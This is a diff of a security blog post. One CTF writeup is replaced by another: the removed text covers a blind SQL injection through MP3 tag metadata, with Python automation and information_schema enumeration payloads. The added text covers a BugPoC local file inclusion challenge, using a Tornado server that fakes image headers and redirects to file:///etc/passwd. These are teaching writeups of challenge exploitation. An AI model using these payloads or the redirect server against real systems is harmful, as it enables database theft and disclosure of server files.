@@ -7,146 +7,77 @@ image: /writeups/assets/images/lfichallenge.jpeg
 category: Writeups
 ---
 <br>
+
 ## Description
-The CTF was about exploit a terribly insane blind SQLi. I started doing the CTF in the morning, lost my entire day on simple mistakes, and got really frustrated when doing the challenge. The URL given to me was [https://web.ctflearn.com/audioedit/](https://web.ctflearn.com/audioedit/). I received this challenge at night from my friend Jokr.
+Browsing twitter i saw a new challenge from BugPoC which was about LFI I immediately started solving it. The image said to visit [http://social.buggywebsite.com/](https://social.buggywebsite.com/) to start the challenge. Also, since it was server sided bug, i got energized to solve. 
 
-### Finding the Injection
-As its name suggests, it takes `.mp3` file and edits it. So, we have a file upload which leads to an edit page with a unique generated filename. I tried playing with file upload. Eventually, it leads me to nowhere and I assumed file upload was secure. So, what to do then. Well, it took me some time to realize the file was being fetched from the database. The parameter looked like this: [file=0b07586dffe744a6f2ee824248ed8e61283a3497.mp3](https://web.ctflearn.com/audioedit/edit.php?file=0b07586dffe744a6f2ee824248ed8e61283a3497.mp3)  
+### Starting point
+First of I had to find sink where i could execute LFI. I tried typing and it generated the option to share. Looking at the source code more, i find a compressed javascript file, it showed various functinons. After analyzing the code, I found out only request starting with `https` made an xhr request and to https://api.buggywebsite.com. It send json data with url and requestTime parameter.
+```js
+function processUrl(e) {
+    requestTime = Date.now(), url = "https://api.buggywebsite.com/website-preview";
+    var t = new XMLHttpRequest;
+    t.onreadystatechange = function() {
+        4 == t.readyState && 200 == t.status ? (response = JSON.parse(t.responseText), populateWebsitePreview(response)) : 4 == t.readyState && 200 != t.status && (console.log(t.responseText), document.getElementById("website-preview").style.display = "none")
+    }, t.open("POST", url, !0), t.setRequestHeader("Content-Type", "application/json; charset=UTF-8"), t.setRequestHeader("Accept", "application/json"), data = {
+        url: e,
+        requestTime: requestTime
+    }, t.send(JSON.stringify(data))
+```
 
-Though jokr said SQLi isn't here still I tried SQL injection and injecting a quote, I got error **" Error fetching audio from DB"** which confirmed the vulnerability.
+### Developing client
+I had to write a client that interacts with API with those parameters filled with value. First, i found `get_second()` (a function to get current second) in stackoverflow answer. Then for url i used input prompt on while loop. A successful response is shown below. Then i parsed the data using json module. Then the content of image is dumped to file. Here's my source code: [Exploit.py](https://gist.github.com/machinexa2/118a7983b407cca55a6a1801a10acb7c)  
 
-![Error String](/writeups/assets/images/ctflearn_audioedit_errorpage.png)
+![Response](/writeups/assets/images/lfichallenge_response.png)
 
-Trying SQLi for some time again failed me. It wasn't working for some reason (not because of rabbit). Later, injecting " gave me the same error as '  which means it's not vulnerable. I took some caffeine and started thinking where could I find a possible attack vector as I could only upload .mp3. 
+Now, i tried different stuffs, ideas such as SSRF but it wasnt working. I later realized it was using urllib3 to make requests which could never result in LFI but only SSRF. Also, SSRF was also not possible as it was not showing response and was probably blocked. Also, since the API wasnt vulnerable i looked for other endpoints etc but nothing seemed to work. Playing with it for some amount of time releaved something that i missed before.  
 
-Later he gave a hint that SQLi is in Exif metadata. Also, `exiftool` didn't work for the mp3 file, so I had to find something different. The module `python3-mutagen` is a module for adding tags in mp3 which provided `mid3v2` a perfect cmd line script for the situation.
+### Open Graph metadata
+It was parsing the `<meta>` tags and reflecting them. OG is short for Open Graph which allows web page to become a rich object in social graph. It had lot of tags and some tags that were being reflected were `og:description`, `og:type`, `og:image` and `og.url`. Also, description, type and url didnt have much effect on the server. However, image was again fetching resources and used urllib3. Trying for SSRF again failed me and wasnt solution of challenge so i moved on.
 
-### Knowing the Injection
-First, I found the vulnerability by adding ' and " and then confirmed it. `mid3v2 -a "' or '" testing.mp3` is an example of how to inject SQL payload to music tags. I got 0 in author response which indicates condition evaluated to False. Since, running the program, uploading it, and checking the condition is lengthy, I used `Burpsuite` which was my second mistake.  
+Looking at different perspective, i found the following details:
+* It fetches similar to this `^https://.*\.(jpg|svg|png)`
+* Serving other file with extensions fails HEAD test, parser checks by mimetype which can be bypassed
+* Seriving `.jpg` file with jpg magic header, base64 encodes the returned image response   
 
-![Burp Request](/writeups/assets/images/ctflearn_audioedit_burprequest.png)
+![Details](/writeups/assets/images/lfichallenge_details.png)
 
-I tried sending some advanced payloads like `' or 1=1 or '` and `' and 1=1 and '` to see how it behaves. Unfortunately, it was throwing error. Each time I tried something new, it gave an error. One more thing to notice is that uploading file with the same content but entirely different filename caused **File Exist** error to be thrown. Mine frustration slowly increased with time, later I found out it was because I directly edited the request from burp suite *(which I should never have).*
+I tried putting html, php and other code in jpeg mimetype file but it didnt work. I also tried using exif tags for code execution which didnt work too. I was quite lost at this moments and those weird hints from BugPoC made me more mad.  
 
-I tried to make a python3 script to upload the file and directly give me response which cost me around 1-2 hour. I used http instead of https which caused error. Finally i have a script that does automatically does everything, i just have to type the payload. Here's a small portion: 
+### Hitting the jackpot
+Since, HEAD request was used to verify whether its image or not, I coded in tornado to create a server. I set content-type and other headers of image, and issued redirection to /etc/passwd at second get request which should hopefully get us /etc/passwd. A small snippet shows how I coded it:   
 ```python
-url = "https://web.ctflearn.com/audioedit/submit_upload.php"
-while True:
-    s = requests.Session()
-    multipart_data = MultipartEncoder(
-        fields = {
-            'audio': ('testing.mp3', open('testing.mp3', 'rb'), 'audio/mpeg')
-        })
-    headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Content-Type': multipart_data.content_type
-        } 
-    def setcmd():
-        command = 'mid3v2 -a "' + get_random_string(4) + input("Enter SQLi payload: ") + '" testing.mp3'
-        print(command)
-        system(command)
-    setcmd()
-    response = s.post(url, data=multipart_data, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    for small in soup.find_all('small'):
-        print(small)
-``` 
-<br>
-Finally, I found out what I was exploiting was boolean-based blind SQLi. The injection point was `' or SQL COMMAND or '`. For further confirmation, I did this which I thought would eval to true and did evaluate to true `' and 2=2 or 99=99 or '`.
+class FileHandler(tornado.web.RequestHandler):
+    def head(self):
+        self.set_header('Content-Length', 237)
+        self.set_header('Content-Type', 'image/svg+xml')
+        self.set_header('Location', 'http://fa0cf2d0f26e.ngrok.io//asset/original.jpg')
+    def get(self):
+        self.set_header('Content-Type', 'image/svg+xml')
+        self.set_header('Location', 'file:///etc/motd')
+        self.write("<p>You should be redirected automatically to target URL: <a href='file:///etc/passwd'>file:///etc/passwd</a>")
+        self.redirect("file:///etc/motd")
 
-### Exploring SQLi Blindly
-The insanity starts here. I DM'ed **Blindhero**, another of my nice mentor/friend for some tips on how to get DBMS, tables... He told me to use `SELECT CASE WHEN` which works on `Sqlite`. Unfortunately, it didn't work as it was `MySQL`. He also said about how to get a database, table, and so on. He constantly helped me debug my payload. Now, i started by very basic information gathering payload `' and 2=2 or (SELECT substr(version(),1,1)=5) or '`  which returned 1 and is equivalent to boolean true. 
-
-Then, moving forward to finding the current database which was not easy but ok. Since it was boolean-based blind doing it by hand would take ages. So, I coded some exploit. Crafting query took time but eventually this `' and 2=2 or (SELECT substr(database(),1,1)='a')` returned true. Here's some of my code with an explanation.
-```python
-allchar = 'abcdeghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-E = SQLExploit()
-while True:
-    for i in allchar:
-        s = requests.Session()
-        E.reset()
-        time.sleep(0.2)
-        if E.exploitdb(i) == True:
-            print("Breaked loop")
-            break
-        else:
-            continue
-``` 
-<br>
-E is an SQLExploit object which I will talk later and tries all the character while the `reset()` function opens the mp3 file again. I ran into a problem where the first query ran successfully while the second error out in a while loop. This again wasted my 10 minutes along with giving me some irritation. Later I fixed it by reopening the file each time I execute the loop. The SQLExploit class looks like this: 
-```python
-class SQLExploit:
-    def __init__(self):
-        self.md = ""
-        self.hd = ""
-        self.text = ""
-        self.pos = 1
-
-    def reset(self):
-        self.md = MultipartEncoder(
-            fields = {
-                'audio': ('testing.mp3', open('testing.mp3', 'rb'), 'audio/mpeg')
-            }
-        )
-        self.hd = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Content-Type': self.md.content_type
-        }
-    def setcmd(self, character):
-        #Finds database
-        try:
-            command = 'mid3v2 -a "' + get_random_string(5) +   "' and 2=2 or (select substr(database()," + str(self.pos) + ",1)='" + character +"') or '" + '" testing.mp3'
-            print(command)
-            system(command)
-        except Exception as E:
-            print(E)
+class IndexHandler(tornado.web.RequestHandler):
+    def head(self):
+        self.set_header('Content-Length', 237)
+        self.set_header('Content-Type', 'image/svg+xml')
+        self.set_header('Cache-Control', 'public, max-age=0')
+        self.set_header('Pragma', 'no-cache')
+        self.redirect('/asset/original.jpg')
+    def get(self):
+        with open('index.html', 'rb') as f:
+            self.write(f.read())
 ```
 <br>
-`self.md` and `self.hd` are multipart data and headers respectively. `reset()` opens the mp3 file while `get_random_string(5)` gets random string of length 5 as it name says. `system()` is short of `os.system()` and position is `self.pos` is position of substr. Since, we got 1st postion as 'a', we need to increment it. `self.text` is for storing name of database found.
+Now, lets host the malicious server, and get that file. Also, i rechanged lot of my exploit.py and other files to make it as easy to get the file. I hit the jackpot got the file!
 
-So, having everything we need let's start the exploit. Also, some part was slightly modified in this code which I won't show as it's not necessary.
-Now, let's run the exploit. 
+![Pwned](/writeups/assets/images/lfichallenge_pwned.png)
 
-![Database Audioedit](/writeups/assets/images/ctflearn_audioedit_database.png)
+## Takeaway 
 
-Looks nice right? Let's go for a table. I asked him about how to find tables and hinted about information_schema. I created a similar database and table in localhost and came up with this:  
- `(SELECT table_schema, table_name FROM information_schema.tables where table_schema = 'audioedit' and table_name LIKE 'a%' limit 1;)`
+* Always try harder, if i left when i failed SSRF, I couldn't have solved the challenge 
+* Javascript files are gold mine. Do always read them and try to find sensitive endpoints.
+* Coding is essential to exploit development. Make sure you master at least a single programming language.
 
-Unfortunately, it's hard to include this upper payload in SQLi, and that's why I did the `substr()` method. Also, after debugging my payload and improving it I get:     
-
-`' and 2=2 or (SELECT substr(table_name,1,1) FROM information_schema.tables where table_schema = 'audioedit' limit 1)='h' or '`   
- 
-I also modified the `setcmd()` function slightly and exploiting gives me `audioedit` which is the same as the database name. Ah, I was tired and irritated. Took some caffeine again and got started. For numbers of columns in that table, querying information schema I used this:   
-
-`' and 2=2 or (SELECT substr(count(*),1,1) FROM information_schema.columns WHERE table_name = 'audioedit')=1 or '`  
-<br>
-So, after running script i know number of columns are 5, now what. After writing another payload to find column it errored out no matter what i used. Now, this part was very tough to debug. I just went mad trying to find out what was the problem. It took about 3 hours to find what was the problem. I crafted about 4-5 payloads, none of them were working.
-```sql
-' and 2=2 or (SELECT substr(column_name,1,1) FROM information_schema.columns where table_name='audioedit' limit 1 OFFSET 1)='a' or '
-' and 2=2 or (SELECT((SELECT count(*) FROM information_schema.columns WHERE table_name = 'audioedit' and column_name LIKE 'xx%')=1)) or '
-' and 2=2 or (select substr(column_name,1,1)='y' from information_schema.columns where table_name = 'audioedit' limit 1,1) or '
-```
-<br>
-First, I thought limit was blocked as every payload used it. Trying simpler payloads like `' and 2=2 or (select version() like '5%' limit 1) or '` did work. I got to a point when the payload was large, then I added ()  which caused the error. Oh, so spaces are the problem. Why the hell did I use 2=2. Shit. Also, i reduced `get_random_string()` to length of 2. Finally, it worked like a charm and got the first column name, then second, then third... 
-
-![Random Column name](/writeups/assets/images/ctflearn_audioedit_random.png)
-
-I did some SQL magic in column File and found out the flag was in file `supersecretflagf1le.mp3`. So, I used the file parameter to reference that file, and unfortunately, I didn't get a flag. 
-
-### Audio Editing
-Its the final step, setting visualization to a sonogram and editing some other kind of stuff, I got the flag embedded in the image. After submitting I felt quite relaxed.
-
-![Random Column name](/writeups/assets/images/ctflearn_audioedit_flag.png)
-
-I used this resource constantly during exploiting SQLi: [SQL Wiki](https://sqlwiki.netspi.com/)
-
-
-### Takeaway 
-
-* Always check for the length of SQL query you can inject.
-* Pay attention to smaller details to prevent error.
-* Never edit a binary by hand in Burpsuite. It's prone to errors.
-
-
+Some hints from BugPoC helped me but last ones were absurb and meaningless. Also, I necessarily didnt have to code server and client. For server i could have used BugPoC mock endpoint and for client i could have user either burp or browser thought for testing purposes, client is best!
